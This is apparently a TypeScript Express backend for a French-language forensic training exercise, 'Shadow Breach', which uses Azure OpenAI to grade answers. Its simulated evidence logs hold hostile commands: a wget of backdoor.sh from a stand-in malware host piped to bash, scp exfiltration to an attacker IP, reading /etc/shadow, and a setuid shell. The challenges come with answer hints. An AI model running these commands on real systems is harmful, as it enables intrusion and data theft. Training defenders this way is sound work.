import { Request, Response } from 'express';
import { pool, db } from './db';
import * as schema from '../shared/schema';
import { eq } from 'drizzle-orm';
import { v4 as uuidv4 } from 'uuid';

// Configuration de l'API Azure OpenAI
const AZURE_OPENAI_ENDPOINT = process.env.AZURE_OPENAI_ENDPOINT;
const AZURE_OPENAI_KEY = process.env.AZURE_OPENAI_KEY;
const AZURE_OPENAI_DEPLOYMENT = process.env.AZURE_OPENAI_DEPLOYMENT;

// Interfaces pour les objets du module d'analyse forensique
interface Evidence {
  id: string;
  name: string;
  type: string;
  content: string;
  description: string;
  metadata?: {
    timestamp?: string;
    size?: string;
    source?: string;
    format?: string;
  };
}

interface ForensicChallenge {
  id: string;
  title: string;
  question: string;
  relatedEvidenceIds: string[];
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  points: number;
  hints: string[];
  solutionHint: string;
}

interface UserAnswer {
  challengeId: string;
  answer: string;
  userId: string;
  sessionId: string;
}

interface ForensicSession {
  id: string;
  userId: string;
  scenarioId: string;
  discoveredEvidenceIds: string[];
  completedChallengeIds: string[];
  startTime: Date;
  lastActivity: Date;
  score: number;
  status: 'in_progress' | 'completed';
  currentTab?: string;
  userHypothesis?: string;
}

// Stockage en mémoire des sessions et des défis (sera remplacé par une base de données dans une phase ultérieure)
const forensicSessions = new Map<string, ForensicSession>();
const forensicChallenges = new Map<string, ForensicChallenge>();

// Catalogue des preuves disponibles dans le scénario "Shadow Breach"
const shadowBreachEvidence: Evidence[] = [
  {
    id: 'auth-log',
    name: 'Journal d\'authentification',
    type: 'log',
    description: 'Logs d\'authentification du serveur principal de TradeSphere',
    content: `
May 03 02:14:22 finserver sshd[31752]: Failed password for root from 198.51.100.43 port 43245 ssh2
May 03 02:14:24 finserver sshd[31752]: Failed password for root from 198.51.100.43 port 43245 ssh2
May 03 02:14:29 finserver sshd[31752]: Failed password for root from 198.51.100.43 port 43245 ssh2
May 03 02:15:34 finserver sshd[31752]: Failed password for root from 198.51.100.43 port 43245 ssh2
May 03 02:15:53 finserver sshd[31752]: Failed password for root from 198.51.100.43 port 43245 ssh2
May 03 04:37:01 finserver sshd[32655]: Accepted password for admin from 198.51.100.43 port 56789 ssh2
May 03 04:37:05 finserver sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/find /var/log -type f -mtime +30 -delete
May 03 04:38:12 finserver sudo: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
May 03 04:42:38 finserver sshd[33100]: Disconnected from user admin 198.51.100.43 port 56789
May 03 07:16:54 finserver sshd[34255]: Accepted publickey for newuser from 198.51.100.43 port: 60122
May 03 07:17:05 finserver sudo: newuser : command not allowed ; TTY=pts/0 ; PWD=/home/newuser ; USER=root ; COMMAND=/usr/bin/apt install netcat
May 03 07:17:22 finserver sudo: newuser : TTY=pts/0 ; PWD=/home/newuser ; USER=root ; COMMAND=/bin/cp /bin/bash /tmp/.hidden/bsh
May 03 07:17:35 finserver sudo: newuser : TTY=pts/0 ; PWD=/tmp/.hidden ; USER=root ; COMMAND=/bin/chmod +s bsh
May 03 07:18:01 finserver sshd[34255]: Disconnected from user newuser 198.51.100.43 port 60122`,
    metadata: {
      timestamp: '06/05/2025 10:32',
      size: '425 Ko',
      source: 'Serveur de production',
      format: 'syslog'
    }
  },
  {
    id: 'user-accounts',
    name: 'Liste des comptes utilisateurs',
    type: 'file',
    description: 'Liste des comptes utilisateurs ayant accès au système',
    content: `
# Liste des utilisateurs système extraite de /etc/passwd
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
developer:x:1001:1001:Developer Account:/home/developer:/bin/bash
support:x:1002:1002:Support Team:/home/support:/bin/bash
backup:x:1003:1003:Backup Service:/home/backup:/bin/bash
newuser:x:1004:1004:New Hire:/home/newuser:/bin/bash   # Créé le 03/05/2025`,
    metadata: {
      timestamp: '06/05/2025 11:05',
      size: '256 Ko',
      source: 'Serveur de production',
      format: 'passwd'
    }
  },
  {
    id: 'network-capture',
    name: 'Capture réseau',
    type: 'network',
    description: 'Extrait de la capture de trafic réseau au moment des événements suspects',
    content: `
# Extrait de l'analyse de trafic réseau (tcpdump)
10:15:22.342 IP 198.51.100.43.43245 > finserver.ssh: TCP 64 [SYN]
10:15:22.342 IP finserver.ssh > 198.51.100.43.43245: TCP 60 [SYN, ACK]
10:15:22.376 IP 198.51.100.43.43245 > finserver.ssh: TCP 52 [ACK]
...
12:42:05.127 IP 198.51.100.43.56789 > finserver.ssh: TCP 112 [PSH, ACK]
12:42:05.221 IP finserver.ssh > 198.51.100.43.56789: TCP 912 [PSH, ACK]
...
15:21:33.901 IP finserver.36245 > 203.0.113.5.6667: TCP 84 [PSH, ACK]   # Connexion IRC
15:22:01.332 IP 203.0.113.5.6667 > finserver.36245: TCP 142 [PSH, ACK]
...
15:23:17.221 IP finserver.44521 > 203.0.113.5.1337: TCP 8192 [PSH, ACK] # Exfiltration
15:23:17.335 IP 203.0.113.5.1337 > finserver.44521: TCP 52 [ACK]`,
    metadata: {
      timestamp: '06/05/2025 12:44',
      size: '2.3 Mo',
      source: 'IDS Palo Alto',
      format: 'PCAP (extrait)'
    }
  },
  {
    id: 'security-log',
    name: 'Journal de sécurité',
    type: 'log',
    description: 'Logs de la solution EDR déployée sur les serveurs de production',
    content: `
2025-05-03 04:38:45 ALERT User=admin Process=/bin/bash CommandLine="cat /etc/shadow" Category=Credential_Access
2025-05-03 04:40:12 NOTICE User=admin Process=/usr/bin/find CommandLine="find / -type f -name '*.conf' -size +1M" Category=Discovery
2025-05-03 04:41:27 NOTICE User=admin Process=/usr/bin/scp CommandLine="scp /tmp/data.zip 198.51.100.43:/home/attacker/" Category=Exfiltration
2025-05-03 07:18:30 ALERT User=newuser Process=/tmp/.hidden/bsh CommandLine="./bsh -p" Category=Privilege_Escalation
2025-05-03 07:19:22 ALERT User=newuser Process=/usr/bin/wget CommandLine="wget hxxp://malware.example[.]com/backdoor.sh -O /tmp/update.sh" Category=Execution
2025-05-03 07:20:15 ALERT User=newuser Process=/bin/bash CommandLine="bash /tmp/update.sh" Category=Execution
2025-05-03 15:20:32 ALERT User=root Process=/tmp/.service CommandLine="/tmp/.service -c" Category=Command_And_Control
2025-05-03 15:22:45 ALERT User=root Process=/usr/bin/zip CommandLine="zip -r /tmp/customer_data.zip /var/www/fintech/customer/" Category=Collection`,
    metadata: {
      timestamp: '06/05/2025 13:18',
      size: '1.7 Mo',
      source: 'EDR CrowdStrike',
      format: 'CEF'
    }
  },
  {
    id: 'process-list',
    name: 'Liste des processus',
    type: 'file',
    description: 'Capture de la liste des processus en cours d\'exécution (ps aux)',
    content: `
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 171476 11952 ?        Ss   May03   0:12 /sbin/init
root         2  0.0  0.0      0     0 ?        S    May03   0:00 [kthreadd]
root       781  0.0  0.1  72908  5768 ?        Ss   May03   0:00 /usr/sbin/sshd -D
mysql     1103  0.2  2.3 1187084 189244 ?      Sl   May03   2:31 /usr/sbin/mysqld
www-data  1286  0.0  0.4 214448 35800 ?        S    May03   0:02 /usr/sbin/apache2 -k start
www-data  1287  0.0  0.4 214452 35808 ?        S    May03   0:02 /usr/sbin/apache2 -k start
root      5438  0.0  0.1  16164  9592 ?        S    07:45   0:00 /tmp/.service -c
newuser   5443  0.0  0.1  72908  5768 ?        Ss   07:46   0:00 /bin/bash
root      5621  0.0  0.1  16164  9592 ?        S    15:30   0:00 /usr/bin/python3 /tmp/script.py`,
    metadata: {
      timestamp: '06/05/2025 14:30',
      size: '128 Ko',
      source: 'Serveur de production',
      format: 'txt'
    }
  }
];

// Challenges du scénario Shadow Breach
const shadowBreachChallenges: ForensicChallenge[] = [
  {
    id: 'initial-access',
    title: 'Accès Initial',
    question: 'Analysez les journaux d\'authentification. Comment l\'attaquant a-t-il obtenu son accès initial au système? Identifiez l\'adresse IP et le compte utilisé.',
    relatedEvidenceIds: ['auth-log', 'user-accounts'],
    difficulty: 'beginner',
    points: 10,
    hints: [
      'Recherchez des tentatives de connexion multiples sur un même compte',
      'Vérifiez s\'il y a eu des connexions réussies après ces tentatives'
    ],
    solutionHint: 'L\'attaquant a utilisé le compte admin depuis l\'IP 198.51.100.43 après avoir tenté de faire du brute force sur le compte root'
  },
  {
    id: 'persistence',
    title: 'Mécanisme de Persistance',
    question: 'Comment l\'attaquant a-t-il établi sa présence persistante dans le système? Décrivez la technique utilisée et le compte impliqué.',
    relatedEvidenceIds: ['auth-log', 'user-accounts', 'security-log'],
    difficulty: 'intermediate',
    points: 15,
    hints: [
      'Recherchez la création de nouveaux comptes utilisateurs',
      'Examinez les commandes exécutées avec des privilèges élevés',
      'Repérez les manipulations de fichiers dans des répertoires temporaires ou cachés'
    ],
    solutionHint: 'L\'attaquant a créé un nouvel utilisateur (newuser) et a mis en place un binaire setuid dans /tmp/.hidden/'
  },
  {
    id: 'data-exfiltration',
    title: 'Exfiltration de Données',
    question: 'Quelles preuves indiquent que des données ont été exfiltrées? Précisez le canal d\'exfiltration, la destination et estimez la quantité de données exfiltrées.',
    relatedEvidenceIds: ['network-capture', 'security-log'],
    difficulty: 'intermediate',
    points: 20,
    hints: [
      'Examinez les connexions sortantes inhabituelles',
      'Recherchez des transferts de données vers des destinations externes',
      'Vérifiez la taille des paquets pour estimer le volume de données'
    ],
    solutionHint: 'Les données ont été exfiltrées vers 203.0.113.5 sur le port 1337, avec environ 8 Ko de données'
  },
  {
    id: 'malware-identification',
    title: 'Identification du Malware',
    question: 'Un malware a été déployé sur le système. Identifiez son nom de processus, sa méthode de dissimulation et son fonctionnement.',
    relatedEvidenceIds: ['security-log', 'process-list'],
    difficulty: 'advanced',
    points: 25,
    hints: [
      'Examinez les processus en cours d\'exécution pour repérer des anomalies',
      'Cherchez des téléchargements suspects dans les logs de sécurité',
      'Vérifiez les processus qui s\'exécutent sous des utilisateurs privilégiés'
    ],
    solutionHint: 'Le malware s\'exécute sous le nom de \'.service\' dans /tmp/, téléchargé via backdoor.sh et utilisé pour établir une connexion Command & Control'
  }
];

// Initialiser les défis dans la map lors du chargement du module
shadowBreachChallenges.forEach(challenge => {
  forensicChallenges.set(challenge.id, challenge);
});

/**
 * Génère une session d'analyse forensique pour l'utilisateur
 */
export async function initForensicSession(req: Request, res: Response) {
  try {
    const { userId, scenarioId } = req.body;
    
    if (!userId || !scenarioId) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID utilisateur et ID scénario requis' 
      });
    }
    
    // Créer une nouvelle session
    const sessionId = uuidv4();
    const newSession: ForensicSession = {
      id: sessionId,
      userId,
      scenarioId,
      discoveredEvidenceIds: [],
      completedChallengeIds: [],
      startTime: new Date(),
      lastActivity: new Date(),
      score: 0,
      status: 'in_progress',
      currentTab: 'briefing'
    };
    
    forensicSessions.set(sessionId, newSession);
    
    return res.status(201).json({
      success: true,
      sessionId,
      session: newSession
    });
  } catch (error) {
    console.error('Erreur lors de l\'initialisation de la session forensique:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de l\'initialisation de la session'
    });
  }
}

/**
 * Récupère les informations de la session d'analyse forensique
 */
export async function getForensicSession(req: Request, res: Response) {
  try {
    const { sessionId } = req.params;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID de session requis' 
      });
    }
    
    const session = forensicSessions.get(sessionId);
    
    if (!session) {
      return res.status(404).json({ 
        success: false, 
        message: 'Session non trouvée' 
      });
    }
    
    // Mettre à jour l'horodatage de dernière activité
    session.lastActivity = new Date();
    forensicSessions.set(sessionId, session);
    
    return res.status(200).json({
      success: true,
      session
    });
  } catch (error) {
    console.error('Erreur lors de la récupération de la session forensique:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de la récupération de la session'
    });
  }
}

/**
 * Récupère les preuves disponibles pour un scénario d'analyse forensique
 */
export async function getEvidenceList(req: Request, res: Response) {
  try {
    const { scenarioId, sessionId } = req.query;
    
    if (!scenarioId) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID du scénario requis' 
      });
    }
    
    let evidenceList: Evidence[] = [];
    
    // Sélectionner les preuves en fonction du scénario
    if (scenarioId === 'shadow-breach') {
      evidenceList = shadowBreachEvidence;
    } else {
      return res.status(404).json({ 
        success: false, 
        message: 'Scénario non trouvé' 
      });
    }
    
    // Si un sessionId est fourni, filtrer les preuves découvertes
    if (sessionId) {
      const session = forensicSessions.get(sessionId as string);
      
      if (session) {
        // Pour chaque preuve, ajouter une propriété 'discovered' indiquant si elle a été découverte
        const evidenceWithDiscoveryStatus = evidenceList.map(evidence => ({
          ...evidence,
          discovered: session.discoveredEvidenceIds.includes(evidence.id)
        }));
        
        return res.status(200).json({
          success: true,
          evidenceList: evidenceWithDiscoveryStatus
        });
      }
    }
    
    // Si pas de session, retourner toutes les preuves comme non découvertes
    const evidenceWithDiscoveryStatus = evidenceList.map(evidence => ({
      ...evidence,
      discovered: false
    }));
    
    return res.status(200).json({
      success: true,
      evidenceList: evidenceWithDiscoveryStatus
    });
  } catch (error) {
    console.error('Erreur lors de la récupération des preuves:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de la récupération des preuves'
    });
  }
}

/**
 * Récupère le détail d'une preuve spécifique
 */
export async function getEvidenceDetail(req: Request, res: Response) {
  try {
    const { evidenceId, scenarioId, sessionId } = req.params;
    
    if (!evidenceId || !scenarioId) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID de preuve et ID de scénario requis' 
      });
    }
    
    let evidenceList: Evidence[] = [];
    
    // Sélectionner les preuves en fonction du scénario
    if (scenarioId === 'shadow-breach') {
      evidenceList = shadowBreachEvidence;
    } else {
      return res.status(404).json({ 
        success: false, 
        message: 'Scénario non trouvé' 
      });
    }
    
    const evidence = evidenceList.find(e => e.id === evidenceId);
    
    if (!evidence) {
      return res.status(404).json({ 
        success: false, 
        message: 'Preuve non trouvée' 
      });
    }
    
    // Si un sessionId est fourni, mettre à jour la session pour marquer la preuve comme découverte
    if (sessionId) {
      const session = forensicSessions.get(sessionId);
      
      if (session) {
        if (!session.discoveredEvidenceIds.includes(evidenceId)) {
          session.discoveredEvidenceIds.push(evidenceId);
          session.lastActivity = new Date();
          forensicSessions.set(sessionId, session);
        }
      }
    }
    
    return res.status(200).json({
      success: true,
      evidence
    });
  } catch (error) {
    console.error('Erreur lors de la récupération du détail de la preuve:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de la récupération du détail de la preuve'
    });
  }
}

/**
 * Récupère les défis disponibles pour un scénario d'analyse forensique
 */
export async function getChallengeList(req: Request, res: Response) {
  try {
    const { scenarioId, sessionId } = req.query;
    
    if (!scenarioId) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID du scénario requis' 
      });
    }
    
    let challengeList: ForensicChallenge[] = [];
    
    // Sélectionner les défis en fonction du scénario
    if (scenarioId === 'shadow-breach') {
      challengeList = shadowBreachChallenges;
    } else {
      return res.status(404).json({ 
        success: false, 
        message: 'Scénario non trouvé' 
      });
    }
    
    // Si un sessionId est fourni, filtrer les défis complétés
    if (sessionId) {
      const session = forensicSessions.get(sessionId as string);
      
      if (session) {
        // Pour chaque défi, ajouter une propriété 'completed' indiquant s'il a été réussi
        const challengesWithCompletionStatus = challengeList.map(challenge => ({
          ...challenge,
          completed: session.completedChallengeIds.includes(challenge.id),
          // Ne pas envoyer solutionHint
          solutionHint: undefined
        }));
        
        return res.status(200).json({
          success: true,
          challengeList: challengesWithCompletionStatus
        });
      }
    }
    
    // Si pas de session, retourner tous les défis comme non complétés
    const challengesWithCompletionStatus = challengeList.map(challenge => ({
      ...challenge,
      completed: false,
      // Ne pas envoyer solutionHint
      solutionHint: undefined
    }));
    
    return res.status(200).json({
      success: true,
      challengeList: challengesWithCompletionStatus
    });
  } catch (error) {
    console.error('Erreur lors de la récupération des défis:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de la récupération des défis'
    });
  }
}

/**
 * Analyse une réponse à un défi en utilisant Azure OpenAI
 */
export async function analyzeChallengeAnswer(req: Request, res: Response) {
  try {
    const { sessionId, challengeId, answer } = req.body;
    
    if (!sessionId || !challengeId || !answer) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID de session, ID de défi et réponse requis' 
      });
    }
    
    const session = forensicSessions.get(sessionId);
    
    if (!session) {
      return res.status(404).json({ 
        success: false, 
        message: 'Session non trouvée' 
      });
    }
    
    const challenge = forensicChallenges.get(challengeId);
    
    if (!challenge) {
      return res.status(404).json({ 
        success: false, 
        message: 'Défi non trouvé' 
      });
    }
    
    // Obtenir les preuves liées au défi
    const relatedEvidence = shadowBreachEvidence.filter(evidence => 
      challenge.relatedEvidenceIds.includes(evidence.id)
    );
    
    // Construire le prompt pour l'analyse de la réponse
    const prompt = `
Tu es un évaluateur expert en cybersécurité spécialisé dans l'analyse forensique numérique. 
Tu vas évaluer la réponse d'un apprenant à un défi d'investigation.

DÉFI: ${challenge.question}

INFORMATIONS DISPONIBLES:
${relatedEvidence.map(e => `${e.name}: ${e.content}`).join('\n\n')}

SOLUTION ATTENDUE:
${challenge.solutionHint}

RÉPONSE DE L'APPRENANT:
${answer}

Évalue la pertinence de la réponse sur une échelle de 0 à 100, où 100 signifie que la réponse est parfaite.
Fournis également un feedback constructif pour aider l'apprenant à s'améliorer.

Réponds sous ce format JSON exactement:
{
  "score": <note sur 100>,
  "correct": <true si score >= 70, false sinon>,
  "feedback": "<feedback constructif détaillé>",
  "key_insights": ["<point clé 1>", "<point clé 2>", ...],
  "missing_elements": ["<élément manquant 1>", "<élément manquant 2>", ...],
  "additional_resources": ["<ressource 1>", "<ressource 2>", ...]
}
`;

    // Faire l'appel à Azure OpenAI
    const evaluationResult = await callAzureOpenAI(prompt);
    let parsedResult;
    
    try {
      parsedResult = JSON.parse(evaluationResult);
    } catch (error) {
      console.error('Erreur lors du parsing de la réponse JSON d\'Azure OpenAI:', error);
      console.log('Réponse brute:', evaluationResult);
      
      // Tenter d'extraire le JSON en cas de réponse mal formatée
      const jsonMatch = evaluationResult.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        try {
          parsedResult = JSON.parse(jsonMatch[0]);
        } catch (innerError) {
          return res.status(500).json({ 
            success: false, 
            message: 'Erreur lors de l\'analyse de la réponse' 
          });
        }
      } else {
        return res.status(500).json({ 
          success: false, 
          message: 'Erreur lors de l\'analyse de la réponse' 
        });
      }
    }
    
    // Mettre à jour la session si la réponse est correcte
    if (parsedResult.correct && !session.completedChallengeIds.includes(challengeId)) {
      session.completedChallengeIds.push(challengeId);
      session.score += challenge.points;
      session.lastActivity = new Date();
      forensicSessions.set(sessionId, session);
    }
    
    return res.status(200).json({
      success: true,
      evaluation: parsedResult,
      sessionUpdated: parsedResult.correct
    });
  } catch (error) {
    console.error('Erreur lors de l\'analyse de la réponse au défi:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de l\'analyse de la réponse au défi'
    });
  }
}

/**
 * Génère une hypothèse de scénario d'attaque complète basée sur les preuves et les analyses de l'utilisateur
 */
export async function generateAttackHypothesis(req: Request, res: Response) {
  try {
    const { sessionId, userHypothesis } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID de session requis' 
      });
    }
    
    const session = forensicSessions.get(sessionId);
    
    if (!session) {
      return res.status(404).json({ 
        success: false, 
        message: 'Session non trouvée' 
      });
    }
    
    // Vérifier si l'utilisateur a découvert assez de preuves
    if (session.discoveredEvidenceIds.length < 3) {
      return res.status(400).json({ 
        success: false, 
        message: 'Pas assez de preuves découvertes pour générer une hypothèse' 
      });
    }
    
    // Récupérer les preuves découvertes
    const discoveredEvidence = shadowBreachEvidence.filter(evidence => 
      session.discoveredEvidenceIds.includes(evidence.id)
    );
    
    // Construire le prompt pour la génération de l'hypothèse
    const prompt = `
Tu es un expert en analyse forensique numérique spécialisé dans la reconstruction des incidents de cybersécurité.
Sur la base des preuves suivantes, tu vas générer une hypothèse complète et détaillée du déroulement de l'attaque.

PREUVES DISPONIBLES:
${discoveredEvidence.map(e => `${e.name}: ${e.content}`).join('\n\n')}

${userHypothesis ? `HYPOTHÈSE DE L'UTILISATEUR:\n${userHypothesis}\n\n` : ''}

Génère une chronologie détaillée de l'attaque, en expliquant chaque étape avec des timestamps précis lorsque c'est possible.
Identifie les techniques MITRE ATT&CK utilisées à chaque étape.
Explique comment l'attaquant a procédé, quelles vulnérabilités ont été exploitées et quelles données ont été compromises.

Réponds sous ce format JSON exactement:
{
  "timeline": [
    {"timestamp": "<date/heure>", "stage": "<phase d'attaque>", "technique": "<technique MITRE ATT&CK>", "description": "<description détaillée>"},
    ...
  ],
  "attack_vector": "<vecteur d'attaque initial>",
  "motive": "<motivation probable de l'attaquant>",
  "impact": "<impact de l'attaque>",
  "indicators_of_compromise": ["<IOC 1>", "<IOC 2>", ...],
  "additional_comments": "<analyse supplémentaire>",
  "missing_evidence": ["<preuve manquante 1>", "<preuve manquante 2>", ...],
  "confidence_level": "<niveau de confiance dans l'hypothèse>"
}
`;

    // Faire l'appel à Azure OpenAI
    const hypothesisResult = await callAzureOpenAI(prompt);
    let parsedHypothesis;
    
    try {
      parsedHypothesis = JSON.parse(hypothesisResult);
    } catch (error) {
      console.error('Erreur lors du parsing de la réponse JSON d\'Azure OpenAI:', error);
      console.log('Réponse brute:', hypothesisResult);
      
      // Tenter d'extraire le JSON en cas de réponse mal formatée
      const jsonMatch = hypothesisResult.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        try {
          parsedHypothesis = JSON.parse(jsonMatch[0]);
        } catch (innerError) {
          return res.status(500).json({ 
            success: false, 
            message: 'Erreur lors de la génération de l\'hypothèse' 
          });
        }
      } else {
        return res.status(500).json({ 
          success: false, 
          message: 'Erreur lors de la génération de l\'hypothèse' 
        });
      }
    }
    
    // Mettre à jour la session avec l'hypothèse de l'utilisateur
    if (userHypothesis) {
      session.userHypothesis = userHypothesis;
      session.lastActivity = new Date();
      forensicSessions.set(sessionId, session);
    }
    
    return res.status(200).json({
      success: true,
      hypothesis: parsedHypothesis
    });
  } catch (error) {
    console.error('Erreur lors de la génération de l\'hypothèse d\'attaque:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de la génération de l\'hypothèse d\'attaque'
    });
  }
}

/**
 * Fonction utilitaire pour appeler l'API Azure OpenAI
 */
async function callAzureOpenAI(prompt: string): Promise<string> {
  try {
    if (!AZURE_OPENAI_ENDPOINT || !AZURE_OPENAI_KEY || !AZURE_OPENAI_DEPLOYMENT) {
      throw new Error('Variables d\'environnement Azure OpenAI manquantes');
    }
    
    const url = `${AZURE_OPENAI_ENDPOINT}/openai/deployments/${AZURE_OPENAI_DEPLOYMENT}/chat/completions?api-version=2024-12-01-preview`;
    
    const headers = {
      'Content-Type': 'application/json',
      'api-key': AZURE_OPENAI_KEY
    };
    
    const body = {
      messages: [
        {
          role: 'system',
          content: 'Tu es un expert en cybersécurité et analyse forensique numérique. Tu fournis des réponses précises et détaillées dans le format demandé.'
        },
        {
          role: 'user',
          content: prompt
        }
      ],
      temperature: 0.2,
      max_tokens: 2000
    };
    
    const response = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(body)
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Erreur API Azure OpenAI: ${response.status} ${response.statusText} - ${errorText}`);
    }
    
    const data = await response.json();
    return data.choices[0].message.content;
  } catch (error) {
    console.error('Erreur lors de l\'appel à Azure OpenAI:', error);
    throw error;
  }
}

/**
 * Met à jour l'onglet actif de la session
 */
export async function updateSessionTab(req: Request, res: Response) {
  try {
    const { sessionId, tab } = req.body;
    
    if (!sessionId || !tab) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID de session et onglet requis' 
      });
    }
    
    const session = forensicSessions.get(sessionId);
    
    if (!session) {
      return res.status(404).json({ 
        success: false, 
        message: 'Session non trouvée' 
      });
    }
    
    // Mettre à jour l'onglet actif de la session
    session.currentTab = tab;
    session.lastActivity = new Date();
    forensicSessions.set(sessionId, session);
    
    return res.status(200).json({
      success: true,
      message: 'Onglet de session mis à jour'
    });
  } catch (error) {
    console.error('Erreur lors de la mise à jour de l\'onglet de session:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de la mise à jour de l\'onglet de session'
    });
  }
}

/**
 * Termine une session d'analyse forensique
 */
export async function completeForensicSession(req: Request, res: Response) {
  try {
    const { sessionId } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        message: 'ID de session requis' 
      });
    }
    
    const session = forensicSessions.get(sessionId);
    
    if (!session) {
      return res.status(404).json({ 
        success: false, 
        message: 'Session non trouvée' 
      });
    }
    
    // Marquer la session comme terminée
    session.status = 'completed';
    session.lastActivity = new Date();
    forensicSessions.set(sessionId, session);
    
    return res.status(200).json({
      success: true,
      message: 'Session terminée avec succès',
      sessionSummary: {
        id: session.id,
        userId: session.userId,
        scenarioId: session.scenarioId,
        score: session.score,
        discoveredEvidenceCount: session.discoveredEvidenceIds.length,
        completedChallengeCount: session.completedChallengeIds.length,
        duration: Math.floor((new Date().getTime() - session.startTime.getTime()) / 1000 / 60) // en minutes
      }
    });
  } catch (error) {
    console.error('Erreur lors de la finalisation de la session forensique:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Erreur serveur lors de la finalisation de la session'
    });
  }
}